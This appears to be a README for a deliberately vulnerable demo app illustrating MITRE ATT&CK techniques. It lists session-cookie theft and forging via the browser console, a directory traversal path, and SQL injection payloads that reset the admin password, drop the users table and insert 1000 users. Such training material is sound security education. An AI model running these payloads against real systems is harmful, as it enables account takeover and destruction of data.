# Demonstration Instructions for MITRE Techniques
A simple application for demonstrating MITRE ATT&amp;CK techniques

## 1. Steal Session Token or Set Your Own
- **Steal the token** using the console command:
  
  ```javascript
  console.log(document.cookie);
  ```

- **Set your own session token**:
  
  ```javascript
  document.cookie = "session_token=nfyyobG1qSZmpoOcYSZd; path=/";
  ```

## 2. Log in Using the Session Token
- Use the session token obtained or set in step 1 to access the account without entering credentials.

## 3. Find Hidden File Using Directory Traversal
- Access the hidden file by navigating to the following path:

  ```
  /.../.../.../secret.txt
  ```

## 4. Reset the Admin Password Using SQL Injection
- Use the following SQL injection to set the admin's password to `1`:

  ```sql
  ' OR 1=1; UPDATE users SET password = '1' WHERE username = 'admin';--
  ```

## 5. Delete the Users Table
- Execute this SQL injection to drop the entire `users` table:

  ```sql
  ' OR 1=1; DROP TABLE users;--
  ```

## 6. Populate the Users Table with a Large Number of Users
- Insert 1000 different users into the `users` table using this SQL injection:

  ```sql
  ' OR 1=1; INSERT INTO users (username, password, role) SELECT 'user'||a.id, 'pass'||a.id, 'user' FROM (SELECT 1 AS id UNION ALL SELECT 2 UNION ALL SELECT 3 UNION ALL SELECT 4 UNION ALL SELECT 5 UNION ALL SELECT 6 UNION ALL SELECT 7 UNION ALL SELECT 8 UNION ALL SELECT 9 UNION ALL SELECT 10) AS a, (SELECT 1 AS id UNION ALL SELECT 2 UNION ALL SELECT 3 UNION ALL SELECT 4 UNION ALL SELECT 5 UNION ALL SELECT 6 UNION ALL SELECT 7 UNION ALL SELECT 8 UNION ALL SELECT 9 UNION ALL SELECT 10) AS b, (SELECT 1 AS id UNION ALL SELECT 2 UNION ALL SELECT 3 UNION ALL SELECT 4 UNION ALL SELECT 5 UNION ALL SELECT 6 UNION ALL SELECT 7 UNION ALL SELECT 8 UNION ALL SELECT 9 UNION ALL SELECT 10) AS c LIMIT 1000;--
  ```

## Important Note
These demonstrations are intended only for educational and security research purposes. Do not attempt these actions on any system without proper authorization.
